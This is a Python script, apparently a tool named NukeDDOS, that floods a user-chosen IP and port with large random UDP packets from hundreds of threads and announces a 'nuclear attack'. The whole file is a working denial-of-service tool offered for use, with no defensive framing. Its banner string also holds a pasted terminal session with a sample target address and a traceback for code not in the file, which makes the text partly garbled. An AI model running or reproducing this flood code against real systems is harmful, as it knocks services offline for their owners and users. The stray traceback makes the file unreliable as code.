import os
import time
import socket
import random
import threading

def optimize_system():
    try:
        os.nice(-20)
    except:
        pass

    try:
        socket.SO_SNDBUF = 1024 * 1024
    except:
        pass

os.system("clear")
print("""
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██████╗  ██████╗ ███████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║  ██║██║  ██║██║   ██║███████╗
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║██║  ██║██║   ██║╚════██║
██║ ╚████║╚██████╔╝██║  ██╗███████╗██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   

Target IP: 172.67.213.24
Port: 443
Threads (recomendado 500+): 10
Traceback (most recent call last):
  File "/home/kali/Importante/PaineisGITHUB/NukeDDOS/NukeDDOS.py", line 42, in <module>
    optimize_system()
    ~~~~~~~~~~~~~~~^^
  File "/home/kali/Importante/PaineisGITHUB/NukeDDOS/NukeDDOS.py", line 22, in optimize_system
    bpf = struct.pack('HL', len(program), ctypes.create_string_buffer(bytes(program)))
                                                                      ~~~~~^^^^^^^^^
ValueError: bytes must be in range(0, 256)
                                                                                                                                                                                                                                            
┌──(laila19㉿phdsec)-[~/Importante/PaineisGITHUB/NukeDDOS]
└─$ 




   
""")

target = input("Target IP: ").strip()
port = int(input("Port: ").strip())
thread_count = int(input("Threads (recommended 500+): ").strip())
packet_size = 65507

optimize_system()
random.seed(time.time())
data = random._urandom(packet_size)

socks = []
for _ in range(min(100, thread_count)):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, packet_size)
        socks.append(s)
    except:
        pass

def flood():
    while True:
        try:
            for s in socks:
                fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                
                for _ in range(50):
                    try:
                        s.sendto(data, (target, port))
                    except:
                        pass
                
                try:
                    s.sendto(data[:1024], (target, port))
                    s.sendto(data[1024:2048], (target, port))
                    s.sendto(data[2048:3072], (target, port))
                except:
                    pass
        except:
            pass

print("\nStarting nuclear attack...")
for _ in range(thread_count):
    try:
        threading.Thread(target=flood, daemon=True).start()
    except:
        pass

print(f"Attacking {target}:{port} with {thread_count} threads")
while True:
    time.sleep(1)
